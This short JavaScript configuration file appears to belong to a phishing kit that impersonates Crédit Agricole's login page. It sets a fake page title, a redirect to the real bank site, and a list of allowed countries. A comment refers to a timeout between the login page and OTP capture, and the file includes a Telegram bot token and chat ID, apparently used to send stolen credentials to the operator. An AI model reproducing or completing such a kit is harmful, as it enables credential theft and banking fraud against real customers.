const config = {
  name: "AGR", // Provider Name
  mail: "test@mail.com", // User E-mail
  subject: "RZ",
  timeout: 5000, // time out between login Page and OTP
  titlePage: "Accéder à mes comptes - Crédit Agricole", // Title header bar
  redirectTo: "https://www.credit-agricole.fr/",
  version: 3,
  branch: 3,
  allowCountry: ["FR", "CI"],
  telegramToken: "2023508021:AAGc-6vYPtOr-SsNt6kwSODD6QOw9_IWMl8", // telegram token
  telegramId: "-547313332", // telegram id
};

window.config = config;
